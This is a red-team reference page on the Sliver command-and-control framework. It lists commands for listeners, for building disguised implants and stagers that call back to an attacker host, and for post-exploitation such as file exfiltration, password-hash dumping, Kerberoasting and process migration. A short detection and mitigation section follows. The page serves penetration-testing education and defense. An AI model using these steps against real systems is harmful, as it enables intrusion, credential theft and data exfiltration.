% Filename: 06-red-teaming/c2-frameworks/sliver.md
% Display name: Sliver C2
% Last update: 2026-02-11
% ATT&CK Tactics: TA0011 (Command and Control)
% ATT&CK Techniques: T1071.001 (Application Layer Protocol: Web Protocols), T1573 (Encrypted Channel)
% Authors: @TristanInSec

# Sliver C2

## Overview

Sliver is an open-source, cross-platform C2 framework developed by BishopFox. It generates implants in Go that compile to native binaries for Windows, Linux, and macOS. Sliver supports multiple C2 channels (mTLS, HTTP/S, DNS, WireGuard), multi-operator collaboration, and has built-in features for pivoting, SOCKS proxying, and traffic encryption. It is a strong alternative to Cobalt Strike for engagements that need an open-source, cross-platform framework.

## ATT&CK Mapping

- **Tactic:** TA0011 - Command and Control
- **Techniques:**
  - T1071.001 - Application Layer Protocol: Web Protocols
  - T1573 - Encrypted Channel

## Prerequisites

- Sliver server: `apt install sliver` (Kali) or download from GitHub
- Sliver client for multi-operator use

## Techniques

### Server Setup

```bash
# Sliver
# https://github.com/BishopFox/sliver

# Start the Sliver server (daemon mode)
sliver-server daemon &

# Start the Sliver server (interactive mode)
sliver-server

# Generate operator config for multi-operator setup
sliver-server operator -n operator1 -l <team_server_ip> -p 31337 -s /tmp/operator1.cfg

# On the operator's machine — import config and connect
sliver-client import /tmp/operator1.cfg
sliver-client
```

### Listeners

```c2
# Sliver
# https://github.com/BishopFox/sliver

# Start an mTLS listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Start an HTTPS listener
sliver > https --lhost 0.0.0.0 --lport 443 --domain <c2_domain>

# Start a DNS listener
sliver > dns --domains <c2_domain>

# Start a WireGuard listener
sliver > wg --lport 53

# List active listeners (called "jobs" in Sliver)
sliver > jobs

# Kill a listener
sliver > jobs -k <job_id>
```

### Implant Generation

```c2
# Sliver
# https://github.com/BishopFox/sliver

# --- Stageless Implants (full binary, no stager needed) ---

# Windows HTTPS implant
sliver > generate --http <c2_domain> --os windows --arch amd64 --save /tmp/implant.exe

# Linux mTLS implant
sliver > generate --mtls <team_server_ip>:8888 --os linux --arch amd64 --save /tmp/implant

# macOS DNS implant
sliver > generate --dns <c2_domain> --os darwin --arch amd64 --save /tmp/implant

# Multiple C2 channels (failover: tries mTLS first, then HTTPS, then DNS)
sliver > generate --mtls <ip>:8888 --http <c2_domain> --dns <c2_domain> \
    --os windows --arch amd64 --save /tmp/implant.exe

# Shellcode output
sliver > generate --http <c2_domain> --os windows --arch amd64 \
    --format shellcode --save /tmp/implant.bin

# Shared library (DLL)
sliver > generate --http <c2_domain> --os windows --arch amd64 \
    --format shared --save /tmp/implant.dll

# --- Stagers (small, downloads full implant) ---

sliver > generate stager --lhost <attacker_ip> --lport 443 --protocol tcp \
    --save /tmp/stager.bin

# --- Implant Naming ---

# Custom implant name
sliver > generate --http <c2_domain> --os windows --name FINANCE_UPDATE --save /tmp/implant.exe

# List generated implants
sliver > implants
```

### Session Management

```c2
# Sliver
# https://github.com/BishopFox/sliver

# List active sessions (sessions = interactive, beacons = async)
sliver > sessions
sliver > beacons

# Interact with a session
sliver > use <session_id>

# Interact with a beacon
sliver > use <beacon_id>

# Background current session
sliver (IMPLANT_NAME) > background

# Kill a session
sliver > sessions -k <session_id>

# Rename a session
sliver (IMPLANT_NAME) > rename --name WEBSERVER01
```

### Post-Exploitation Commands

```c2
# Sliver
# https://github.com/BishopFox/sliver

# --- System Information ---
sliver (IMPLANT) > info        # OS, hostname, username, PID
sliver (IMPLANT) > whoami
sliver (IMPLANT) > getuid
sliver (IMPLANT) > getpid
sliver (IMPLANT) > ps          # Process list
sliver (IMPLANT) > ifconfig    # Network interfaces
sliver (IMPLANT) > netstat     # Active connections

# --- File System ---
sliver (IMPLANT) > ls
sliver (IMPLANT) > cd C:\\Users
sliver (IMPLANT) > pwd
sliver (IMPLANT) > cat C:\\Users\\admin\\Desktop\\flag.txt
sliver (IMPLANT) > download C:\\Users\\admin\\Documents\\secrets.docx /tmp/
sliver (IMPLANT) > upload /tmp/tool.exe C:\\Windows\\Tasks\\tool.exe
sliver (IMPLANT) > mkdir C:\\Windows\\Tasks\\staging
sliver (IMPLANT) > rm C:\\Windows\\Tasks\\old_payload.exe

# --- Execution ---
sliver (IMPLANT) > shell               # Interactive shell
sliver (IMPLANT) > execute -o cmd.exe /c whoami   # Execute command
sliver (IMPLANT) > execute-assembly /tmp/Seatbelt.exe -group=all  # .NET in-memory

# --- Pivoting ---
sliver (IMPLANT) > socks5 start        # Start SOCKS5 proxy
sliver (IMPLANT) > portfwd add -b 127.0.0.1:8080 -r <target>:80  # Port forward
sliver (IMPLANT) > pivots              # List pivot listeners

# --- Credential Access ---
sliver (IMPLANT) > hashdump            # Dump local password hashes (requires admin)

# --- Evasion ---
sliver (IMPLANT) > migrate <pid>       # Migrate to another process
```

### Armory (Extensions)

```c2
# Sliver
# https://github.com/BishopFox/sliver

# Sliver Armory provides community extensions (BOFs, tools)

# List available extensions
sliver > armory

# Install an extension
sliver > armory install rubeus
sliver > armory install seatbelt
sliver > armory install sharpup

# Use installed extension
sliver (IMPLANT) > rubeus kerberoast
sliver (IMPLANT) > seatbelt -group=all
```

### Profiles and Implant Configuration

```c2
# Sliver
# https://github.com/BishopFox/sliver

# Create a reusable implant profile
# Profile name is a positional argument (not a --name flag)
# --name sets the implant binary name, not the profile name
sliver > profiles new --http <c2_domain> --os windows --arch amd64 --format exe \
    windows-https-profile

# Generate from profile
# Profile name is a positional argument, not --name
sliver > profiles generate windows-https-profile --save /tmp/implant.exe

# HTTP C2 configuration
# Sliver supports custom HTTP headers, URLs, and user agents
# Configured during implant generation or via profiles
```

## Detection Methods

### Network-Based Detection

- Default Sliver HTTP/S traffic patterns (URI structures, header patterns)
- mTLS connections to non-standard ports
- DNS C2: high-volume DNS queries to a single domain
- WireGuard tunnel to unexpected endpoints

### Host-Based Detection

- Go-compiled binary characteristics (large binary size, Go runtime strings)
- In-memory .NET assembly execution (execute-assembly)
- SOCKS proxy and port forwarding activity
- Process migration behavior

## Mitigation Strategies

- **Network monitoring** — detect C2 traffic patterns specific to Sliver
- **EDR** — behavioral detection of execute-assembly, process migration, credential dumping
- **DNS monitoring** — detect DNS tunneling for DNS C2 channel
- **Application control** — block execution of unsigned Go binaries

## References

### Official Documentation

- [Sliver C2 Framework](https://github.com/BishopFox/sliver)
- [Sliver Documentation](https://sliver.sh/)

### MITRE ATT&CK

- [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
- [T1573 - Encrypted Channel](https://attack.mitre.org/techniques/T1573/)
